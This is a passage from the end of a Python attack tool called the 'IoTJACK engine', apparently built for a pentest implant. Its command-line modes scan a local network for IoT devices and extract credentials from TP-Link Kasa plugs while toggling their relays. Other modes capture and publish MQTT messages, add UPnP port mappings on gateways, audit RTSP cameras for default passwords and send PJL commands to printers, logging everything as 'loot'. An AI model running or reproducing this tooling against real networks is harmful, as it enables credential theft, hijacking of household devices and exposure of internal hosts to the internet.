            print("... %d/%d probes" % (done, total), flush=True)

    if not args.json:
        print("Scanning %s/%s on %s (%d ports/host)..."
              % (ip, args.cidr, args.iface, len(ports)), flush=True)
    devices = scan_network(ip, args.cidr, ports, timeout=args.timeout,
                           progress=None if args.json else progress)
    out_path = os.path.join(loot.path,
                            "scan_%s.json" % time.strftime("%Y%m%d_%H%M%S"))
    with open(out_path, "w", encoding="utf-8") as f:
        json.dump(devices, f, indent=2)
    loot.event("scan", iface=args.iface, cidr=args.cidr,
               profile=args.profile, devices=len(devices))
    if args.json:
        print(json.dumps(devices), flush=True)
    else:
        print("Found %d device(s):" % len(devices), flush=True)
        for d in devices:
            ports_s = ",".join(str(p) for p in d["ports"][:10])
            print("  %-15s %-7s %-28s %s" % (d["ip"], d["kind"],
                                             d["name"][:28], ports_s),
                  flush=True)
        print("Saved: %s" % out_path, flush=True)
    return 0


def mode_kasa(args):
    loot = Loot(args.loot)
    try:
        if args.action == "creds":
            res = kasa_action(args.target, args.port, "creds")
            info = kasa_action(args.target, args.port, "sysinfo")
            out = {"status": 1, "action": "creds", "stainfo": res,
                   "alias": info.get("alias", ""), "model": info.get("model", "")}
        else:
            res = kasa_action(args.target, args.port, args.action, args.state)
            out = {"status": 1, "action": args.action, "result": res}
    except Exception as exc:
        out = {"status": 0, "error": str(exc)}
    if out.get("status"):
        print_kv(out)
    else:
        print("error: %s" % out.get("error", "failed"), flush=True)
    loot.event("kasa", target=args.target, action=args.action, result=out)
    return 0 if out.get("status") else 1


def mode_mqtt(args):
    loot = Loot(args.loot)
    try:
        if args.action == "probe":
            out = mqtt_probe(args.target, args.port)
        elif args.action == "capture":
            out = mqtt_capture(args.target, args.port, args.seconds, loot,
                               username=args.username or None,
                               password=args.password or None)
        elif args.action == "publish":
            out = mqtt_publish(args.target, args.port, args.topic, args.payload,
                               username=args.username or None,
                               password=args.password or None)
        else:
            out = {"status": 0, "error": "unknown action"}
    except Exception as exc:
        out = {"status": 0, "error": str(exc)}
    print_kv(out)
    loot.event("mqtt", target=args.target, action=args.action,
               result={k: v for k, v in out.items() if k != "topics"})
    return 0 if out.get("status") else 1


def mode_igd(args):
    loot = Loot(args.loot)
    try:
        if args.action == "discover":
            ip = iface_ip(args.iface) or args.target
            devs = igd_discover(ip, seconds=args.seconds)
            out = {"status": 1 if devs else 0, "gateways": devs}
            if args.json:
                print(json.dumps(devs), flush=True)
        else:
            control_url = args.control_url
            svc_type = IGD_SERVICES[0]
            if not control_url:
                ip = iface_ip(args.iface) or args.target
                devs = igd_discover(ip, seconds=args.seconds)
                devs = [d for d in devs if d["ip"] == args.target] or devs
                if not devs:
                    out = {"status": 0, "error": "no IGD found"}
                    print_kv(out)
                    loot.event("igd", target=args.target, action=args.action,
                               result=out)
                    return 1
                control_url = devs[0]["control_url"]
                svc_type = devs[0]["service"]
            _, host, port, _ = parse_url(control_url)
            if args.action == "enum":
                res = igd_enum(host, port, control_url)
                out = {"status": 1, "action": "enum", "result": res}
            elif args.action == "map":
                ok, res = igd_add_mapping(host, port, control_url,
                                          args.ext_port, args.int_port,
                                          args.internal_ip, args.proto,
                                          args.desc, svc_type)
                out = {"status": 1 if ok else 0, "action": "map",
                       "result": res,
                       "mapping": {"ext_port": args.ext_port,
                                   "int_port": args.int_port,
                                   "internal_ip": args.internal_ip,
                                   "proto": args.proto}}
            elif args.action == "unmap":
                ok, res = igd_del_mapping(host, port, control_url,
                                          args.ext_port, args.proto, svc_type)
                out = {"status": 1 if ok else 0, "action": "unmap",
                       "result": res, "ext_port": args.ext_port,
                       "proto": args.proto}
            else:
                out = {"status": 0, "error": "unknown action"}
    except Exception as exc:
        out = {"status": 0, "error": str(exc)}
    if not (args.action == "discover" and args.json):
        print_kv(out)
    loot.event("igd", target=args.target, action=args.action, result=out)
    return 0 if out.get("status") else 1


def mode_tr064(args):
    loot = Loot(args.loot)
    try:
        out = tr064_probe(args.target, args.port)
    except Exception as exc:
        out = {"status": 0, "error": str(exc)}
    print_kv(out)
    loot.event("tr064", target=args.target, result=out)
    return 0 if out.get("status") else 1


def mode_rtsp(args):
    loot = Loot(args.loot)
    try:
        out = rtsp_probe(args.target, args.port, args.path)
    except Exception as exc:
        out = {"status": 0, "error": str(exc)}
    print_kv(out)
    loot.event("rtsp", target=args.target, result=out)
    return 0 if out.get("status") else 1


def mode_pjl(args):
    loot = Loot(args.loot)
    try:
        res = pjl_action(args.target, args.port, args.action, args.message)
        out = {"status": 1, "action": args.action, "result": res}
    except Exception as exc:
        out = {"status": 0, "error": str(exc)}
    print_kv(out)
    loot.event("pjl", target=args.target, action=args.action, result=out)
    return 0 if out.get("status") else 1


# ---------------------------------------------------------------------------
# entry point
# ---------------------------------------------------------------------------

def main():
    parser = argparse.ArgumentParser(description="IoTJACK engine")
    sub = parser.add_subparsers(dest="mode")

    sub.add_parser("ifaces", help="list interfaces with IPv4 addresses")

    p_s = sub.add_parser("scan", help="discover and fingerprint IoT devices")
    p_s.add_argument("--iface", default="wlan0open")
    p_s.add_argument("--loot", default="/root/loot/iotjack")
    p_s.add_argument("--cidr", type=int, default=24)
    p_s.add_argument("--profile", choices=["fast", "full"], default="fast")
    p_s.add_argument("--timeout", type=float, default=0.6)
    p_s.add_argument("--json", action="store_true")

    p_k = sub.add_parser("kasa", help="TP-Link Kasa actions")
    p_k.add_argument("--loot", default="/root/loot/iotjack")
    p_k.add_argument("--target", required=True)
    p_k.add_argument("--port", type=int, default=KASA_PORT)
    p_k.add_argument("--action", required=True,
                     choices=["sysinfo", "creds", "cloud", "emeter", "relay"])
    p_k.add_argument("--state", default="toggle",
                     choices=["on", "off", "toggle"])

    p_m = sub.add_parser("mqtt", help="MQTT broker actions")
    p_m.add_argument("--loot", default="/root/loot/iotjack")
    p_m.add_argument("--target", required=True)
    p_m.add_argument("--port", type=int, default=MQTT_PORT)
    p_m.add_argument("--action", required=True,
                     choices=["probe", "capture", "publish"])
    p_m.add_argument("--seconds", type=int, default=30)
    p_m.add_argument("--topic", default="")
    p_m.add_argument("--payload", default="")
    p_m.add_argument("--username", default="")
    p_m.add_argument("--password", default="")

    p_g = sub.add_parser("igd", help="UPnP IGD actions")
    p_g.add_argument("--loot", default="/root/loot/iotjack")
    p_g.add_argument("--iface", default="wlan0open")
    p_g.add_argument("--target", default="")
    p_g.add_argument("--action", required=True,
                     choices=["discover", "enum", "map", "unmap"])
    p_g.add_argument("--control-url", default="")
    p_g.add_argument("--seconds", type=int, default=3)
    p_g.add_argument("--ext-port", type=int, default=0)
    p_g.add_argument("--int-port", type=int, default=0)
    p_g.add_argument("--internal-ip", default="")
    p_g.add_argument("--proto", default="tcp", choices=["tcp", "udp"])
    p_g.add_argument("--desc", default="mapping")
    p_g.add_argument("--json", action="store_true")

    p_t = sub.add_parser("tr064", help="TR-064 gateway actions")
    p_t.add_argument("--loot", default="/root/loot/iotjack")
    p_t.add_argument("--target", required=True)
    p_t.add_argument("--port", type=int, default=TR064_PORT)

    p_r = sub.add_parser("rtsp", help="RTSP camera default-cred audit")
    p_r.add_argument("--loot", default="/root/loot/iotjack")
    p_r.add_argument("--target", required=True)
    p_r.add_argument("--port", type=int, default=RTSP_PORT)
    p_r.add_argument("--path", default="/")

    p_p = sub.add_parser("pjl", help="PJL printer actions")
    p_p.add_argument("--loot", default="/root/loot/iotjack")
    p_p.add_argument("--target", required=True)
    p_p.add_argument("--port", type=int, default=PJL_PORT)
    p_p.add_argument("--action", required=True,
                     choices=["id", "status", "config", "ls", "display"])
    p_p.add_argument("--message", default="")

    args = parser.parse_args()

    def on_signal(signum, frame):
        STOP.set()

    signal.signal(signal.SIGINT, on_signal)
    signal.signal(signal.SIGTERM, on_signal)

    if args.mode == "ifaces":
        for name, ip in iface_list():
            print("%s\t%s" % (name, ip))
        return
    if args.mode == "scan":
        sys.exit(mode_scan(args))
    if args.mode == "kasa":
        sys.exit(mode_kasa(args))
    if args.mode == "mqtt":
        sys.exit(mode_mqtt(args))
    if args.mode == "igd":
        sys.exit(mode_igd(args))
    if args.mode == "tr064":
        sys.exit(mode_tr064(args))
    if args.mode == "rtsp":
        sys.exit(mode_rtsp(args))
    if args.mode == "pjl":
        sys.exit(mode_pjl(args))
    parser.print_help()


if __name__ == "__main__":
    main()
